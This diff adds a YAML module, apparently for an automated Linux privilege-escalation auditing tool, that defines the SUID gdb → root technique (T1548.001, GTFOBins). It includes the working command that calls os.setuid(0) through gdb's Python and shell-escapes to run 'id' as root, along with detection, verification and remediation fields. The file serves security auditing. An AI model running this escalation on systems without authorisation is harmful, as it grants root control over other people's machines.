@@ -1,0 +1,29 @@
+# SUID gdb → root (GTFOBins)
+technique: T1548.001
+name: SUID gdb → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: gdb
+execute:
+  # gdb's embedded Python calls os.setuid(0) to reassert root, then
+  # the `!` shell-escape runs the proof command.
+  command: "{{binary}} -nx -batch -ex 'python import os;os.setuid(0)' -ex '!id'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    SUID gdb offers an embedded Python interpreter and a shell escape.
+    A one-line Python callback reasserts the SUID EUID, then the shell
+    escape runs the proof command as root.
+  remediation: >
+    Remove the SUID bit from gdb — a debugger with root EUID gives
+    full memory / process control of the target.
+  refs: [T1548.001, GTFOBins/gdb]
